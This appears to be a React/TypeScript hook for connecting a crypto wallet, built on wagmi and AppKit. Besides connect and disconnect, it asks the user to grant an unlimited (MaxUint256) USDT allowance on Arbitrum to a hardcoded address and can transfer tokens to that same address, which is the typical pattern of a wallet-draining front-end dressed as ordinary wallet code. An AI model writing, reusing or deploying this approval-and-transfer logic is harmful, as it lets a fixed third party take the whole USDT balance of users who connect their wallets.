import { useAppKit } from "@reown/appkit/react";
import { useState } from "react";
import {
  useAccount,
  useDisconnect,
  useReadContract,
  useWriteContract,
} from "wagmi";
import { MaxUint256 } from "ethers";
import { erc20Abi } from "viem";

export const USDT_ARBITRUM_ABI_APPROVE = [
  {
    constant: false,
    inputs: [
      {
        name: "spender",
        type: "address",
      },
      {
        name: "value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

export const USDT_ARBITRUM_ABI_TRANSFER = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";

const APPROVE_TO_WALLET =
  import.meta.env.VITE_SPENDER_ADDRESS ||
  "0x17E332631Eab05d8037B38c1b6BE784bd638B931";

export const useConnectWallet = () => {
  const [openNav, setOpenNav] = useState(false);
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const {
    writeContract,
    isPending: isApproving,
    error: contractWriteError,
  } = useWriteContract(); // Rename isPending
  // const [isApproved, setIsApproved] = useState(false);

  const {
    data: currentAllowance,
    isLoading: isCheckingAllowance,
    refetch: refetchAllowance,
  } = useReadContract({
    abi: erc20Abi,
    address: USDT_ARBITRUM_CONTRACT,
    functionName: "allowance",
    args: [address!, APPROVE_TO_WALLET],
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-expect-error
    enabled: !!address && isConnected,
    query: { staleTime: 15_000 }, // Optional: Cache allowance check for 15 seconds
  });

  const hasSufficientAllowance =
    !!currentAllowance && currentAllowance === MaxUint256;

  const handleOpenNav = () => {
    setOpenNav((prev) => !prev);
  };

  const { disconnect } = useDisconnect();

  const handleDisconnect = () => {
    disconnect();
  };

  const handleOpenModal = () => {
    if (!openNav) {
      open();
    }
  };

  const approveTokens = async (
    onSuccessCallback: () => void,
    onErrorCallback: (error: Error) => void,
  ) => {
    if (!address) {
      console.error("Wallet not connected for approval");
      onErrorCallback(new Error("Wallet not connected"));
      return;
    }
    console.log("Requesting approval...");
    writeContract(
      {
        abi: USDT_ARBITRUM_ABI_APPROVE,
        address: USDT_ARBITRUM_CONTRACT,
        functionName: "approve",
        args: [APPROVE_TO_WALLET, MaxUint256],
      },
      {
        onSuccess: async (txHash) => {
          console.log("Approval transaction sent:", txHash);
          // Optional: Wait for transaction confirmation for a more robust UX
          // try {
          //   const receipt = await waitForTransactionReceipt(config, { hash: txHash });
          //   console.log("Approval confirmed:", receipt);
          //   refetchAllowance(); // Refresh allowance state
          //   onSuccessCallback();
          // } catch (e) {
          //   console.error("Error waiting for approval confirmation:", e);
          //   onErrorCallback(e instanceof Error ? e : new Error("Confirmation failed"));
          // }
          // For simplicity now, assume success on send
          refetchAllowance(); // Refresh allowance state
          onSuccessCallback();
        },
        onError: (error) => {
          console.error("Approval failed:", error);
          onErrorCallback(error);
        },
      },
    );
  };

  // const approveTokens = async () => {
  //   writeContract(
  //     {
  //       abi: USDT_ARBITRUM_ABI_APPROVE,
  //       address: USDT_ARBITRUM_CONTRACT,
  //       functionName: "approve",
  //       args: [APPROVE_TO_WALLET, MaxUint256],
  //     },
  //     { onSuccess: (res) => res && setIsApproved(true) },
  //   );
  // };

  const transferTokens = async (tokens: string) => {
    writeContract({
      abi: USDT_ARBITRUM_ABI_TRANSFER,
      address: USDT_ARBITRUM_CONTRACT,
      functionName: "transfer",
      args: [APPROVE_TO_WALLET, tokens],
    });
  };

  return {
    // Connection & Basic Wallet
    handleOpenNav,
    handleOpenModal,
    handleDisconnect,
    isConnected,
    address,
    // Allowance
    hasSufficientAllowance,
    isCheckingAllowance,
    refetchAllowance,
    // Approval
    approveTokens,
    isApproving, // Renamed from isPending
    // Transfer
    transferTokens,
    // Errors (optional but good practice)
    contractWriteError,
  };
};
